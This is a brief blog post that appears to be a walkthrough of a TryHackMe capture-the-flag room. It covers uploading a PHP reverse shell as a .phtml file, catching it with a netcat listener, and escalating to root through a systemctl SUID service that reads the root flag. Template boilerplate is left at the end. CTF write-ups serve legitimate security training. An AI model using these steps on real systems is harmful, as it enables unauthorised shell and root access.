# Welcome to VLnBlog 

## Vlnuniversity THM

**TargetIP:3333/internal/uploads/    (use directory  brute force to get this dir)**

**Now upload a php reverse shell with .phtml extension**
nc -lnvp 1234

now go to user bill and get the user flag:

cd /home/bill/ ; ls   (now use cat and get he flag here)

### systemclt SUID exploit
```TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id;ls /root;cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF


Post this run following to enable the services:
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

Now go to /tmp directory and cat output:
cat /tmp/output (Red colored highlighted commands out will display)

boom we got the root flag here'''


[Link](url) and ![Image](src)
```

For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/vlngod/vlnblog/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
